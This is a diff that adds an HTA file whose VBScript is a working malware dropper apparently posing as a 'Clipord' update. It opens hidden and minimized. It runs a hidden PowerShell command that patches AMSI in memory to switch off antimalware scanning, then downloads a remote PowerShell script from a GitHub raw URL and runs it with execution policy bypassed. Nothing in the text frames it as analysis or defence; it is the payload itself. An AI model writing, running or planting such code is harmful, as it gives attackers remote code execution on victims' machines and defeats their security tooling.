@@ -1,0 +1,17 @@
+<HTA:APPLICATION WINDOWSTATE="minimize" SHOWINTASKBAR="no">
+<script language="VBScript">
+' AMSI bypass via memory patching
+Set r=GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
+r.Create "powershell -w hidden -c ""[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').GetValue($null),0x41414141)""",Null,r,0
+
+' Download and execute PS1
+Set x=CreateObject("Microsoft.XMLHTTP")
+x.Open "GET","https://raw.githubusercontent.com/hotthings7/Clipord-Update/main/assets/update.ps1",False
+x.Send
+
+If x.Status=200 Then
+    ExecuteGlobal("Set o=CreateObject(""Wscript.Shell""):o.Run ""powershell -ep Bypass -w Hidden -c """"&{" & x.ResponseText & "}"""""",0")
+End If
+
+window.close()
+</script>
